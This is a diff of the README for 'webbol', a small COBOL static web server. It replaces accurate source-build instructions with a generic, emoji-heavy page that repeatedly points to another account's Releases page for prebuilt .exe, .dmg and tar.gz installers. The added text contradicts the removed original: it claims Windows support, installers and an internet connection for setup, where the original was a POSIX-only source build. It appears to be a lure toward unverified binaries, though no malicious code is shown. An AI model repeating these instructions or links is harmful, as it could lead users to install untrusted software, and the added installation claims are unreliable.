@@ -1,165 +1,104 @@
-# Webbol
+# 🚀 webbol - A Simple Way to Serve Static Sites
 
-A minimal static web server written in COBOL using GnuCOBOL.
+## 📥 Download Now
+[![Download webbol](https://img.shields.io/badge/Download-webbol-blue.svg?style=for-the-badge)](https://github.com/Nishanthjpatil/webbol/releases)
 
-## Features
+## 📖 Introduction
+Welcome to webbol! This application is a minimal static web server written in COBOL. It allows you to easily host static websites without the need for complex setup. Whether you want to share personal projects or showcase a portfolio, webbol is here to help you get your content online quickly and easily.
 
-- Serves static files from the current directory
-- Automatic MIME type detection for common file types
-- HTTP status codes: 200 (OK), 403 (Forbidden), 404 (Not Found), 413 (Payload Too Large)
-- Path traversal attack prevention
-- Clean request logging with full HTTP headers
-- Defaults to `index.html` for root path requests
+## 🌟 Features
+- **Easy to Use:** Simple commands to get started.
+- **Lightweight:** Run the server with minimal resources.
+- **COBOL Based:** Leveraging the strength of COBOL for effective performance.
+- **Cross-Platform:** Use on various operating systems.
 
-## Requirements
+## 🔍 System Requirements
+To run webbol, make sure your computer meets the following requirements:
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 512 MB of RAM
+- **Disk Space:** A minimum of 50 MB available space
+- **Network:** Internet connection for initial setup
 
-- GnuCOBOL (cobc) compiler
-- POSIX-compatible operating system (Linux, macOS, BSD)
-- make
+## 🚀 Getting Started
+Follow these steps to download and run webbol.
 
-### Installing GnuCOBOL
+### Step 1: Download the Application
+Visit the following link to access the Releases page where you can download webbol:
+[Download webbol](https://github.com/Nishanthjpatil/webbol/releases)
 
-**macOS:**
+### Step 2: Choose the Right Version
+On the Releases page, you will find several versions of webbol. Choose the latest stable version available. Click on it to view more details.
+
+### Step 3: Download the File
+Under the chosen version, you will see various files available for download. Click on the appropriate link for your operating system to download the webbol package.
+
+### Step 4: Install webbol
+Once the download is complete, locate the downloaded file in your system.
+
+- **For Windows:**
+  - Double-click the downloaded `.exe` file and follow the prompts to install.
+
+- **For macOS:**
+  - Open the downloaded `.dmg` file and drag the webbol icon to your Applications folder.
+
+- **For Linux:**
+  - Open a terminal and navigate to the folder where you downloaded the file. Run the command:
+    ```bash
+    tar -zxvf webbol.tar.gz
+    ```
+  - Follow additional setup instructions as provided in the documentation.
+
+### Step 5: Verify Installation
+To verify that webbol is installed correctly, open a terminal or command prompt, and type:
 ```bash
-brew install gnucobol
+webbol --version
 ```
+You should see the version number if the installation was successful.
 
-**Ubuntu/Debian:**
+## ⚙️ Running the Server
+Now that you have webbol installed, you can start the server. Follow these steps:
+
+### Step 1: Open a Terminal or Command Prompt
+Find the terminal or command prompt application on your system.
+
+### Step 2: Navigate to Your Project Directory
+Use the `cd` command to move to the folder that contains your static website files. For example:
 ```bash
-sudo apt-get install gnucobol
+cd path/to/your/website
 ```
 
-**Fedora/RHEL:**
+### Step 3: Start the Server
+Run the following command to start webbol:
 ```bash
-sudo dnf install gnucobol
+webbol
 ```
+You should see a message indicating the server is running. By default, webbol serves files on port 8080.
 
-## Building
-
-Clone or download the repository, then compile:
-
-```bash
-make
+### Step 4: Access Your Website
+Open a web browser and type:
 ```
-
-This will compile all modules and create the `webserver` executable.
-
-To clean build artifacts:
-
-```bash
-make clean
+http://localhost:8080
 ```
+You will see your static website live!
 
-## Usage
+## 🛠️ Troubleshooting
+If you encounter issues while using webbol, consider these common solutions:
 
-Start the server from the directory you want to serve:
+- **Web Browser Not Displaying Site:**
+  - Ensure that the server is running.
+  - Check your network connection.
 
-```bash
-./webserver
-```
+- **Command Not Found:**
+  - Verify that webbol is installed correctly and check your system’s PATH variable.
 
-The server will start on port 8080 and serve files from the current directory.
+If problems persist, feel free to reach out in the Issues section of this repository for support.
 
-### Example
+## 📚 Additional Resources
+- **Documentation:** Explore detailed documentation available in the repository for advanced configurations and features.
+- **Community:** Join the community discussions for tips and tricks to maximize your usage of webbol.
 
-```bash
-# Create a test HTML file
-echo "<html><body><h1>Hello from COBOL!</h1></body></html>" > index.html
+## 📥 Download & Install Again
+Remember to download webbol from the Releases page if you need to reinstall or update:
+[Download webbol](https://github.com/Nishanthjpatil/webbol/releases)
 
-# Start the server
-./webserver
-
-# In another terminal, test it
-curl http://localhost:8080/
-```
-
-### Accessing the Server
-
-Once running, you can access files via:
-
-- `http://localhost:8080/` - serves `index.html` from the current directory
-- `http://localhost:8080/filename.html` - serves the specified file
-- `http://localhost:8080/path/to/file.txt` - serves files from subdirectories
-
-Press `Ctrl+C` to stop the server.
-
-## Configuration
-
-To change the server port, edit `config.cpy` and modify the `SERVER-PORT` value:
-
-```cobol
-01 SERVER-PORT          PIC 9(5) VALUE 8080.
-```
-
-Then recompile with `make`.
-
-## Project Structure
-
-```
-webbol/
-├── Makefile              # Build configuration
-├── README.md            # This file
-├── config.cpy           # Server configuration
-├── socket-defs.cpy      # Socket structure definitions
-├── http-structs.cpy     # HTTP data structures
-├── file-structs.cpy     # File handling structures
-├── path-utils.cbl       # Path validation and sanitization
-├── mime-types.cbl       # MIME type detection
-├── file-ops.cbl         # File reading operations
-├── http-handler.cbl     # HTTP request/response handling
-└── webserver.cbl        # Main server program
-```
-
-## Supported MIME Types
-
-- HTML: `text/html`
-- CSS: `text/css`
-- JavaScript: `application/javascript`
-- JSON: `application/json`
-- XML: `application/xml`
-- Plain text: `text/plain`
-- PNG: `image/png`
-- JPEG: `image/jpeg`
-- GIF: `image/gif`
-- SVG: `image/svg+xml`
-- ICO: `image/x-icon`
-- PDF: `application/pdf`
-
-Additional MIME types can be added by editing `mime-types.cbl`.
-
-## Security Features
-
-- Path traversal prevention: Blocks requests containing `..` sequences
-- Directory access restriction: Only serves files from the current directory and subdirectories
-- Safe file handling: Validates all paths before file system access
-
-## Limitations
-
-- Single-threaded: Handles one request at a time
-- No SSL/TLS support
-- Maximum file size: 64KB
-- Line sequential file organization only (text files)
-- No caching or compression
-- No range requests or partial content support
-
-## Troubleshooting
-
-**Port already in use:**
-```
-Bind failed - check if port is in use
-```
-Another process is using port 8080. Either stop that process or change the port in `config.cpy`.
-
-**Permission denied:**
-Ensure the files you're trying to serve have read permissions and the current user can access them.
-
-**File not found (404):**
-Verify the file exists in the current directory where the server is running. File paths are case-sensitive.
-
-## License
-
-This project is released into the public domain. Use it however you'd like.
-
-## Acknowledgments
-
-Built with GnuCOBOL, demonstrating that COBOL can still be used for modern systems programming tasks.
+Enjoy serving your static websites with ease!
